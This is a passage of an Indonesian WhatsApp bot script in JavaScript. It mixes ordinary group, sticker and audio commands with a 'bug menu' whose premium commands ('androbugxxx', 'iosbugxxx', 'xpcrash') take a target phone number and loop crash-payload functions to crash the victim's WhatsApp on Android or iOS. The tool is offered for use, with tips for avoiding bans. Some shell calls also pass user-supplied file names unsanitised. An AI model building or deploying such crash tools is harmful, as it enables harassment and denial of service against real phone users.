        image: { url: 'https://files.catbox.moe/w1isit.jpg' },
        caption: doneandro,
        footer: "</> 𝘱𝘭𝘦𝘢𝘴𝘦 𝘱𝘢𝘶𝘴𝘦 𝘧𝘰𝘳 10 𝘮𝘪𝘯𝘶𝘵𝘦𝘴 𝘴𝘰 𝘵𝘩𝘢𝘵 𝘵𝘩𝘦 𝘣𝘰𝘵 𝘪𝘴 𝘯𝘰𝘵 𝘣𝘢𝘯𝘯𝘦𝘥",
        buttons: [
            {
                buttonId: "#", 
                buttonText: { displayText: '⟅ ▿ ⿻ 𝐏‌‌𝐇𝚯‌𝐍‌𝐈𝐗‌ ϟ 𝚫‌𝐆‌𝐄‌‌𝐍‌𝐂𝐘‌ ⿻ ▿ ⟆' },
                type: 1
            }
        ],
        contextInfo: {
        externalAdReply: {
            title: "𝐏𝐡𝐨𝐧𝐢𝐱 𝐂𝐫𝐚𝐬𝐡𝐞𝐫",
            body: "sᴜᴄᴄᴇsғᴜʟʟʏ ʙᴜɢ ᴀɴᴅʀᴏɪᴅ", 
            thumbnailUrl: "https://files.catbox.moe/w1isit.jpg",
            sourceUrl: "https://youtube.com/@raldzzoffc",
            mediaType: 1,
            renderLargerThumbnail: true
        }
    },
        headerType: 4,
        viewOnce: true
    }, { quoted: glxNull })

        // Eksekusi perulangan
        for (let i = 0; i < 10; i++) {
            await Raldz1(targetId);
            await Raldz2(targetId);
            await Raldz4(targetId);
            await Raldz5(targetId);
            await Raldz6(targetId);
            await Raldz7(targetId);
            await Raldz8(targetId);
            await sleep(1000)
        }
    } catch (error) {
        console.error("Error saat mengirim bug:", error);
        reply("𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🎗");
    }
    }
    break;
    
case "iosbugxxx":{
if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    if (!isPremium) return reply(mess.premium);

    if (!text) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : .androbugxxx <number> 🎗`);

    const targetId = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
let doneios = `
*\`ᥬ𝐄͢𝐱͠𝐞𝐜͜͡𝐮͢𝐭𝐢𝐯͜͡𝐞 𝐏͢𝐡͠𝐨𝐧͜𝐢𝐱 𝐁͢𝐮͜͡𝐠\`*🩸🐍
⿻ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${targetId}
⿻ 𝗧𝘆𝗽𝗲 : Crash WhatsApp iOS
⿻ 𝗦𝘁𝗮𝘁𝘂𝘀 : Succesfully
`
   try {
    conn.sendMessage(from, {
        image: { url: 'https://files.catbox.moe/w1isit.jpg' },
        caption: doneios,
        footer: "</> 𝘱𝘭𝘦𝘢𝘴𝘦 𝘱𝘢𝘶𝘴𝘦 𝘧𝘰𝘳 5 𝘮𝘪𝘯𝘶𝘵𝘦𝘴 𝘴𝘰 𝘵𝘩𝘢𝘵 𝘵𝘩𝘦 𝘣𝘰𝘵 𝘪𝘴 𝘯𝘰𝘵 𝘣𝘢𝘯𝘯𝘦𝘥",
        buttons: [
            {
                buttonId: "#", 
                buttonText: { displayText: '⟅ ▿ ⿻ 𝐏‌‌𝐇𝚯‌𝐍‌𝐈𝐗‌ ϟ 𝚫‌𝐆‌𝐄‌‌𝐍‌𝐂𝐘‌ ⿻ ▿ ⟆' },
                type: 1
            }
        ],
        contextInfo: {
        externalAdReply: {
            title: "𝐏𝐡𝐨𝐧𝐢𝐱 𝐂𝐫𝐚𝐬𝐡𝐞𝐫",
            body: "sᴜᴄᴄᴇsғᴜʟʟʏ ʙᴜɢ ɪᴏs", 
            thumbnailUrl: "https://files.catbox.moe/w1isit.jpg",
            sourceUrl: "https://youtube.com/@raldzzoffc",
            mediaType: 1,
            renderLargerThumbnail: true
        }
    },
        headerType: 4,
        viewOnce: true
    }, { quoted: glxNull })

        // Eksekusi perulangan
        for (let i = 0; i < 10; i++) {
            await bakios2(targetId);
            await bakios1(targetId);
            await bugios3(targetId);
            await bugios4(targetId);
            await bugios5(targetId);
            await sleep(1000)
        }
    } catch (error) {
        console.error("Error saat mengirim bug:", error);
        reply("𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🎗");
    }
    }
    break;

case 'xpcrash': {
if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    if (!isPremium) return reply(mess.premium)
    if (!text) return m.reply("𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : .xpcrash <number> 🎗");
    let targetId = text.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    let LinkBokep = 'https://files.catbox.moe/mtcj7w.jpg'; // Ganti dengan URL gambar yang valid

    conn.sendMessage(m.chat, {
        image: { url: LinkBokep },
        caption: `\`𝐏͢𝐡𝐨᷍𝐧͢𝐢𝐱 𝐒͢𝐥𝐢𝐞𝐧͢͠𝐜𝐞 𝐄͢𝐱𝐞͠𝐜𝐮͢𝐭𝐢𝐯᷍𝐞\`🐍\n𝗧𝗮𝗿𝗴𝗲𝘁: ${targetId}`,
                            contextInfo: {
      forwardingScore: 99999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363330344810280@newsletter",
                serverMessageId: null,
                  newsletterName: `</> 𝐏𝐡𝐨𝐧𝐢𝐱 - 𝐑𝐚𝐥𝐝𝐳𝐳 </>`
            },
                        mentionedJid: ['6285141370204@s.whatsapp.net'],
                    },
        footer: "© RaldzzXyz",
        buttons: [
            { buttonId: `.androbugxxx ${targetId}`, buttonText: { displayText: "𝗔̷͙ͭͫ̕𝗡̺̻̔̆ͅ𝗗̶͔̭̪̻𝗥͉̜̎͡͠𝗢̖̼ͩ͌͐𝗜̍̅̀̎̊𝗗̶͔̭̪" }, type: 1 },
            { buttonId: `.iosbugxxx ${targetId}`, buttonText: { displayText: "𝗜͔͖̜̉͌𝗢̖̼ͩ͌͐𝗦̵̙͕̀̃" }, type: 1 },
            { buttonId: `.combinebugxxx ${targetId}`, buttonText: { displayText: "𝗨̠҉̷̙ͦ𝗟̸̖̽̌͂𝗧̨͈͗̌ͥ𝗜̍̅̀̎̊𝗠͉̅ͮ͒ͤ𝗔̷͙ͭͫ̕𝗧̨͈͗̌ͥ𝗘̰ͭ̉̇͟" }, type: 1 }
        ],
        headerType: 2,
        viewOnce: true
    }, { quoted: glxNull });
}
break;

// =================== BUG MENU ================== \\

  case "setpp": {
      if (!Access) return reply(mess.owner);
      if (!quoted) return reply(`𝙍𝙚𝙥𝙡𝙮 𝙄𝙢𝙖𝙜𝙚 🎗`);
      try {
          let mime = quoted.message?.imageMessage?.mimetype || quoted.mimetype || "";
          if (!mime.startsWith("image/")) return reply(`𝗢𝗻𝗹𝘆 𝗜𝗺𝗮𝗴𝗲 🎗`);
          if (/webp/.test(mime)) return reply(`𝗢𝗻𝗹𝘆 𝗜𝗺𝗮𝗴𝗲 🎗`);
          let media = await conn.downloadMediaMessage(quoted);
          if (!media) return reply(`yah gagal nih icik bos`);
          await conn.updateProfilePicture(botNumber, media);
          reply(mess.s);
      } catch (error) {
          console.error(error);
          reply(`icik bos ada error nih : ${error}`);
      }
  }
  break 
        
case 'backup':
case 'bp':{
if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
if (!Access) return reply(mess.owner)
const sessionPath = "./session";
    if (fs.existsSync(sessionPath)) {
        const files = fs.readdirSync(sessionPath);
        files.forEach((file) => {
            if (file !== "creds.json") {
                const filePath = path.join(sessionPath, file); 
                if (fs.lstatSync(filePath).isDirectory()) {
                    fs.rmSync(filePath, { recursive: true, force: true });
                } else {  
                    fs.unlinkSync(filePath);
                }
            }
        }
    );
}

    const ls = execSync("ls").toString().split("\n").filter(
        (pe) =>           
        pe != "node_modules" &&   
        pe != "package-lock.json" &&  
        pe != "yarn.lock" &&
        pe != "tmp" &&
        pe != ""
    );

    execSync(`zip -r backup.zip ${ls.join(" ")}`);
    await conn.sendMessage(global.owner, {
        document: fs.readFileSync("./backup.zip"),   
        fileName: "script.zip",
        mimetype: "application/zip",
        caption: "ini adalah file backup mu",
    }, { quoted: m });
    execSync("rm -rf backup.zip");
    await reaction(m.chat, '⚡')
}
break
        
case 'telestick':
  case 'stickertele':
     case 'stele':{
         if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
         if (args.length == 0) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : ${prefix + command} https://t.me/addstickers/bocchi_ryo_y0ursfunny_akaudon 🎗`); 
         if (!isPremium) return reply(mess.premium)
         if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {              
             let res = await Telesticker(args[0]);              
             await reaction(m.chat, "⚡")              
             if (m.isGroup && res.length > 30) {
                 await reply("kebanyakan jirr yaudahh aku kirim di pm aja yak");
                 
                   for (let i = 0; i < res.length; i++) {
                       let encmedia = await conn.sendImageAsSticker(m.sender, res[i].url, m, { 
                           packname: global.packname, 
                           author: global.author });        
                       await fs.unlinkSync(encmedia);
                       await sleep(9000);
                   }
             } else {
                   for (let i = 0; i < res.length; i++) {
                       let encmedia = await conn.sendImageAsSticker(m.chat, res[i].url, m, {
                           packname: global.packname, 
                           author: global.author });
                       await fs.unlinkSync(encmedia)
                       await sleep(9000);           
                   }
               }
           }
       }
       break;
                
       case "banuser":
       case "banneduser":{
           if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
           if (!Access) return reply(mess.owner)
           let who;
           try {
               if (m.isGroup)
                   who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender;
           } catch (err) {
               if (m.isGroup) who = text + "@s.whatsapp.net";
           }
           if (!who) return reply("𝙏𝙖𝙜 𝙊𝙧 𝙍𝙚𝙥𝙡𝙮 🎗");
           const isBen = user_ban.includes(who);
           if (isBen) return reply(`${isBen} mampus tuh udah gw band g bisa akses lagi`);
           user_ban.push(who);
           fs.writeFileSync("./start/lib/database/banned.json", JSON.stringify(user_ban, 2, null));
           await sleep(500);
           reply(mess.s);
       }
       break;
                
       case "unbanneduser":
       case "unbanuser":{
           if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
           if (!Access) return reply(mess.owner)
           let whe;
           try {
               if (m.isGroup)
                   whe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender;
           } catch (err) {
               if (m.isGroup) whe = text + "@s.whatsapp.net";
           }
           if (!whe) return reply("𝙏𝙖𝙜 𝙊𝙧 𝙍𝙚𝙥𝙡𝙮 🎗");
           user_ban.splice(whe, 1);
           fs.writeFileSync("./start/lib/database/banned.json", JSON.stringify(user_ban, 2, null));
           await sleep(500);
           reply(mess.s);
       }
       break;
                
       case "listbanuser":
       case "listbanned":{
           if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
           if (!Access) return reply(mess.owner)
           var textban = `*List Ban User* : *${user_ban.length}*`;
           await conn.sendMessage(m.chat, {
               text: textban,
               contextInfo: {
                   externalAdReply: {
                       title: `© RaldzzXyz`,
                       body: "",
                       thumbnailUrl: cinahitam,
                       sourceUrl: 'https://google.com',
                       mediaType: 1,
                       renderLargerThumbnail: true,
                   }
               }
           }, { quoted: glxNull });
       }
       break;
                
case 'stext':{
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    if (!text) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 :  ${prefix + command} woi hytam 🎗`)
    await reaction(m.chat, "⚡")
    let json = {
        type: 'stories',
        format: 'png',
        backgroundColor: '#1b1e23',
        width: 512,
        height: 720,
        scale: 4,
        watermark: 'Laurine',
        messages: [{
            entities: 'auto',
            avatar: true,
            from: {
                id: 18,
                name: await conn.getName(m.sender),
                photo: {
                    url: await conn.profilePictureUrl(m.sender, 'image').catch(_ => "https://telegra.ph/file/320b066dc81928b782c7b.png")
                }
            },
            text: text 
        }, 
    ]};
    const { data } = await axios.post('https://dikaardnt.com/api/maker/quote', json);
    var media = Buffer.from(data.image, 'base64')
    var res = await uploadImage(media)
    conn.sendMessage(m.chat, {
        image: { url : res },
        caption: '' },{ quoted: glxNull })
}
break
           
case "afk":{
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    if (!m.isGroup) return reply(mess.group);
    if (isAfkOn) return reply("Sedang Afk")
    let reason = text ? text : "gada bjirr";
    afk.addAfkUser(m.sender, Date.now(), reason, _afk);
    reply(`@${m.sender.split("@")[0]} AFK\nAlasan: ${reason}`);
}
break;
            
case 'tovocal':
  case 'getvocal':
    case 'vocal':{
        if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
        if (!text) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : ${prefix + command} it will rain 🎗`)
        let search = await yts(text);
        await reaction(m.chat, "⚡")
        let telaso = search.all[0].url;
        let puqi = await VocalRemover(telaso);
          let vocalAudio = puqi.stuffs.find(item => item.bizType === 'vocal').key;
          conn.sendMessage(m.chat, {
              audio: { url : vocalAudio },
              mimetype: 'audio/mpeg', 
              ptt: true
          },{quoted: glxNull })
        }
      break;
            
case 'remini':
  case 'hd':
    case 'hdr': {
        if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
        if (!quoted || !/image/.test(mime)) return reply(`𝙍𝙚𝙥𝙡𝙮 𝙋𝙝𝙤𝙩𝙤 🎗`)  
        const peler = await quoted.download()              
        let getResult;             
        const ImgLarger = require("./lib/scrape/remini")    
        await reaction(m.chat, "⚡")
        const imgLarger = new ImgLarger();
        try {    
            const Logger = await imgLarger.processImage(peler, 4);
            getResult = Logger.data.downloadUrls[0];
            await conn.sendMessage(m.chat, {      
                image: { url: `${getResult}` }, 
                caption: `> *🍿 fetching - unlimited*

status: succes
creator: rasilius`
            },{ quoted: glxNull });
        } catch (error) { 
            console.error('Proses gagal total:', error.message);        
        }
    }
    break;
        
case 'jodoh': {
    if (!m.isGroup) return reply(mess.group)
    let member = participants.map(u => u.id)
    let orang = member[Math.floor(Math.random() * member.length)]
    let jodoh = member[Math.floor(Math.random() * member.length)]
    reply(`@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`)
}
break
                
case 'banchat':{
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    if (!Access) return reply(mess.owner)
    if (global.db.data.chats[m.chat].isBanned = true) return reply("udah aktif")
    global.db.data.chats[m.chat].isBanned = true
    reply(mess.s)
}
break

case 'unbanchat':{
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    if (!Access) return reply(mess.owner)
    if (global.db.data.chats[m.chat].isBanned = false) return reply("udah g aktif")
    global.db.data.chats[m.chat].isBanned = false
    reply(mess.s)
}
break
        
case 'bass': 
  case 'blown': 
    case 'deep': 
      case 'earrape': 
      case 'fast': 
      case 'fat': 
      case 'nightcore': 
      case 'reverse': 
      case 'robot': 
      case 'slow': 
      case 'smooth': 
      case 'tupai': {
          if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
          if (!/audio/.test(mime)) return reply(`𝙍𝙚𝙥𝙡𝙮 𝘼𝙪𝙙𝙞𝙤 🎗`);
          let set;
          if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20';      
          if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log';       
          if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3';     
          if (/earrape/.test(command)) set = '-af volume=12';      
          if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"';      
          if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"';     
          if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25';        
          if (/reverse/.test(command)) set = '-filter_complex "areverse"';      
          if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"';   
          if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'; 
          if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"';    
          if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"';
          if (/audio/.test(mime)) {
              let media = await conn.downloadAndSaveMediaMessage(quoted);
              await reaction(m.chat, "⚡")
              let ran = getRandomFile('.mp3');
              exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                  fs.unlinkSync(media);
                  if (err) return reply(err);
                  let buff = fs.readFileSync(ran);        
                  sendMusic(buff);
                  fs.unlinkSync(ran);
              });
          }
      }
      break;
            
case 'toimage': 
  case 'toimg': {
      if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
      if (!/webp/.test(mime)) return reply(`𝙍𝙚𝙥𝙡𝙮 𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨`)
      let media = await conn.downloadAndSaveMediaMessage(quoted)
      await reaction(m.chat, "⚡")
      let ran = await getRandomFile('.png')  
      exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media)
          if (err) return err 
          let buffer = fs.readFileSync(ran)   
          conn.sendMessage(m.chat, {   
              image: buffer     
          }, { quoted: glxNull })
          fs.unlinkSync(ran)
      }
    )
  }
  break
                
  case "pin":
  case "pinterest":{
      if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
      if (!text) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : ${prefix + command} tobrut 🎗`);
      await reaction(m.chat, "⚡")
      let data =  await require('axios').get(`https://api.siputzx.my.id/api/s/pinterest?query=${text}`)
      let a = data.data.data
      let result = a[Math.floor(Math.random() * a.length)];
      conn.sendButtonImg(m.chat,
        [
            {
                id: `${prefix + command} ${text}`,
                text: 'next',
                type: 1
            }
        ],"Pin Search Ressults", result.images_url, "© RaldzzXyz - 2025", m, {viewOnce: true })
  }
  break;
                
  case 'h':
  case 'hidetag': {
      if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
      if (!m.isGroup) return reply(mess.group)
      if (!isAdmins && !Access) return reply(mess.admin)
      if (m.quoted) {
          conn.sendMessage(m.chat, {
              forward: m.quoted.fakeObj,
              mentions: participants.map(a => a.id)
          })
      }
      if (!m.quoted) {
          conn.sendMessage(m.chat, {
              text: q ? q : '',
              mentions: participants.map(a => a.id)
          }, { quoted: glxNull })
      }
  }
  break
                
  case "kick":
  case "kik":
  case "dor":{
      if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
      if (!m?.isGroup) return reply(mess.group)
      if (!isAdmins) return reply(mess.admin)
      if (!isBotAdmins) return reply(mess.botadmin)
      if (!text && !m?.quoted) return reply(`𝙏𝙖𝙜 𝙊𝙧 𝙍𝙚𝙥𝙡𝙮 🎗`)
      let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
      await conn.groupParticipantsUpdate(m?.chat, [users], 'remove').catch(console.log)
  }
  break
                
  case 'cekkhodam': {
      if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
      if (!text) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : ${prefix + command} msbrewc`)
      let who
      if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.sender;
      const anunya = [
      "Agus Tampik",
	  "Kaleng Cat Avian",
	  "Pipa Rucika",
	  "Botol Tupperware",
	  "Badut Mixue",
	  "Sabun GIV",
	  "Sandal Swallow",
	  "Jarjit",
	  "Ijat",
	  "Fizi",
	  "Mail",
	  "Ehsan",
	  "Upin",
	  "Ipin",
	  "sungut lele",
	  "Tok Dalang",
	  "Opah",
	  "Opet",
	  "Alul",
	  "Pak Vinsen",
	  "Maman Resing",
	  "Pak RT",
	  "Admin ETI",
	  "Bung Towel",
	  "Lumpia Basah",
	  "Martabak Manis",
	  "Baso Tahu",
	  "Tahu Gejrot",
	  "Dimsum",
	  "Seblak Ceker",
	  "Telor Gulung",
	  "Tahu Aci",
	  "Tempe Mendoan",
	  "Nasi Kucing",
	  "Kue Cubit",
	  "Tahu Sumedang",
	  "Nasi Uduk",
	  "Wedang Ronde",
	  "Kerupuk Udang",
	  "Cilok",
	  "Cilung",
	  "Kue Sus",
	  "Jasuke",
	  "Seblak Makaroni",
	  "Sate Padang",
	  "Sayur Asem",
	  "Kromboloni",
	  "Marmut Pink",
	  "Belalang Mullet",
	  "Kucing Oren",
	  "Lintah Terbang",
	  "Singa Paddle Pop",
	  "Macan Cisewu",
	  "Vario Mber",
	  "Beat Mber",
	  "Supra Geter",
	  "Oli Samping",
	  "Knalpot Racing",
	  "Jus Stroberi",
	  "Jus Alpukat",
	  "Alpukat Kocok",
	  "Es Kopyor",
	  "Es Jeruk",
	  "Cappucino Cincau",
	  "Jasjus Melon",
	  "Teajus Apel",
	  "Pop ice Mangga",
	  "Teajus Gulabatu",
	  "Air Selokan",
	  "Air Kobokan",
	  "TV Tabung",
	  "Keran Air",
	  "Tutup Panci",
	  "Kotak Amal",
	  "Tutup Termos",
	  "Tutup Botol",
	  "Kresek Item",
	  "Kepala Casan",
	  "Ban Serep",
	  "Kursi Lipat",
	  "Kursi Goyang",
	  "Kulit Pisang",
	  "Warung Madura",
	  "Gorong-gorong",
]
      function getRandomKhodam() {
          const randomKhodam = Math.floor(Math.random() * anunya.length);
    return anunya[randomKhodam];
}
const khodam = getRandomKhodam()
      const response = ` 
namalu ${text} dan khodam lu adalah ${khodam} 😂`
      reply(response)
  }
  break
        
  case 'apakah': {
      if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
      if (!q) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : ${prefix + command} saya pacar msbrewcs`)
      const apa = ['iya', 'tidak', 'bisa jadi', 'betul']
      const kah = apa[Math.floor(Math.random() * apa.length)]
      reply(`kamu nanya apakah ${q} kan? jawabannya ${kah}`)
  }
  break
                
  case 'bisakah': {
      if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
      if (!q) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : ${prefix + command} saya menjadi pacar msbrewc`)
      const bisa = ['bisa', 'g bisa', 'g bs awokawok', 'TENTU PASTI KAMU BISA!!!!', 'naik anjing aja, naik anjing']
      const ga = bisa[Math.floor(Math.random() * bisa.length)]
      reply(`kamu nanya bisakah ${q} kan? jawaban nya ${ga}`)
  } 
  break

  case 'bagaimanakah': {
      if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
      if (!q) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : ${prefix + command} cara mengatasi sakit hati 🎗`)
      const gimana = ['gak gimana2', 'sulit itu bro', 'maaf bot tidak bisa menjawab', 'coba deh cari di gugel', 'astaghfirallah beneran???', 'au ah', 'mohon tunggu 99999 abad 🗿', 'gimana yeee']
      const ya = gimana[Math.floor(Math.random() * gimana.length)]
      reply(`kamu nanya bagaimanakah ${q} kan? jawabannya ${ya}`)
  }
  break
                
  case 'antilink': {
      if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)	
      if (!m.isGroup) return reply(mess.group)
      if (!isAdmins && !Access) return reply(mess.admin)		
      if (!isBotAdmins) return reply(mess.botadmin)
      if (!text) return reply(`silakan pilih opsinya, on/off, contoh ${prefix + command} on/off`)
      if (args[0] === "on") {
          if (global.db.data.chats[m.chat].antilink) return reply(`udaaa aktif`)
          global.db.data.chats[m.chat].antilink = true
          reply('done yak icik bosh')
      } else if (args[0] === "off") {		
          if (!global.db.data[m.chat].antilink) return reply(`udah nonaktif`)
          global.db.data[m.chat].antilink = false
          reply(mess.s)
      }
  }
  break
          
 case 'tagme': {
     if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
     if (!isGroup) return false;
     let menst = [m.sender];
     conn.sendMessage(m.chat, { 
         text: `@${m.sender.split('@')[0]}`,  
         mentions: menst        
     }
   )   
 }
 break
                
 case 'promote': {
     if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
     if (!m.isGroup) return reply(mess.group)
     if (!Access && !isAdmins) return reply(mess.admin)
     if (!isBotAdmins) return reply(mess.botadmin)
     if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) return reply('𝙏𝙖𝙜 𝙊𝙧 𝙍𝙚𝙥𝙡𝙮 🎗')
     let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
     if (!m.mentionedJid[0] && !m.quoted && !text) return reply(`𝙏𝙖𝙜 𝙊𝙧 𝙍𝙚𝙥𝙡𝙮 🎗`)
     await reaction(m.chat, "⚡")
     await conn.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(mess.s)).catch((err) => reply('terjadi kesalahan'))
 }
 break
                
 case 'demote':
 case 'dm': {
     if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
     if (!m.isGroup) return reply(mess.group)
     if (!Access && !isAdmins) return reply(mess.admin)
     if (!isBotAdmins) return reply(mess.botadmin)
     if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) return m.warning('𝙏𝙖𝙜 𝙊𝙧 𝙍𝙚𝙥𝙡𝙮 🎗')
     let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
     if (!m.mentionedJid[0] && !m.quoted && !text) return m.warning(`𝙏𝙖𝙜 𝙊𝙧 𝙍𝙚𝙥𝙡𝙮 🎗`)
     await reaction(m.chat, "⚡")
     await conn.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(mess.s)).catch((err) => reply('terjadi kesalahan'))
 }
 break
                
case 'addprem': {
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    if (!Access) return reply(mess.owner)
    const kata = args.join(" ")
    const nomor = kata.split("|")[0];
    const hari = kata.split("|")[1];
    if (!nomor) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : ${prefix + command} 62888|30d 🎗`)
    if (!hari) return reply("𝙄𝙣𝙥𝙪𝙩 𝙏𝙧𝙞𝙖𝙡 𝘿𝙖𝙮 🎗")
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    if (owner.includes(users)) return reply('𝙏𝙝𝙞𝙨 𝙊𝙬𝙣𝙚𝙧 🎗')
    const idExists = _prem.checkPremiumUser(users)
    if (idExists) return reply('')
    let data = await conn.onWhatsApp(users)
    if (data[0].exists) {
        await reaction(m.chat, '🕑')
        _prem.addPremiumUser(users, hari)
        await sleep(3000)
        let cekvip = ms(_prem.getPremiumExpired(users) - Date.now())
        let teks = `𝙎𝙪𝙘𝙘𝙚𝙨𝙨 🎗
- User : @${users.split("@")[0]}
- Expired : ${hari.toUpperCase()}
- Countdown : ${cekvip.days} hari, ${cekvip.hours} jam, ${cekvip.minutes} menit`
        const contentText = {
            text: teks,
            contextInfo: {	
                mentionedJid: conn.ments(teks),
                externalAdReply: {
                    title: `premium user`,
                    previewType: "PHOTO",
                    thumbnailUrl: `https://pomf2.lain.la/f/dynqtljb.jpg`,
                    sourceUrl: 'https://google.com'
                }	
            }	
        };	
        return conn.sendMessage(m.chat, contentText, { quoted: glxNull })
    } else {		
         reply("𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🎗")
    }	
}
break
                
case 'delprem': {
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    if (!Access) return reply(mess.owner)
    if (!args[0]) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : ${prefix + command} 62888 🎗`)
    let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    const idExists = _prem.checkPremiumUser(users)
    if (!idExists) return reply(mess.s)
    let data = await conn.onWhatsApp(users)
    await reaction(m.chat, "⚡")
    if (data[0].exists) {	
        let premium = JSON.parse(fs.readFileSync('./start/lib/database/premium.json'));
        premium.splice(_prem.getPremiumPosition(users), 1)
        fs.writeFileSync('./start/lib/database/premium.json', JSON.stringify(premium))		
        reply(mess.s)
    } else {	
        reply("𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🎗")
    }
}
break

case 'cuki':
case 'peler':
case 'yapit':
case 'anj':
case 'babi':
case 'memek':
case 'mmk':
case 'ajg':
case 'anjing':
case 'kntl':
case 'puki':
case 'yatim':
case 'ytim':
case 'bangsat':
case 'kontol':
case 'stress':
case 'kimak':{
    m.reply(`lu juga ${command} 😂\n\n> Responded By Bot`)
}
break

case 'backdoor':{
let bekdor = ["*`𝐇𝐀𝐂𝐊𝐄𝐃 𝐁𝐘 𝐑𝐀𝐋𝐃𝐙𝐙`😎😈*","awogawog bocil bekdor, lu kira sc ini ada bekdor ha?","kontol kau aja kupasangin bekdor","script ini anti bekdor ya panteq !!!"]
      let load = await conn.sendMessage(m.chat, { text: "*`𝐇𝐀𝐂𝐊𝐄𝐃 𝐁𝐘 𝐑𝐀𝐋𝐃𝐙𝐙`😎😈*" }, { quoted: m });
      for (let i = 0; i < bekdor.length; i++) {
        await delay(1500);
        await conn.sendMessage(
          from,
          { text: bekdor[i], edit: load.key },
          { quoted: glxNull },
        );
      }
}
break
                
case 'addowner': {
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    if (!Access) return reply(mess.owner);
    if (!args[0]) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : ${prefix + command} 62888 🎗`);
    const prem1 = text.split("|")[0].replace(/[^0-9]/g, '');
    const cek1 = await conn.onWhatsApp(`${prem1}@s.whatsapp.net`);
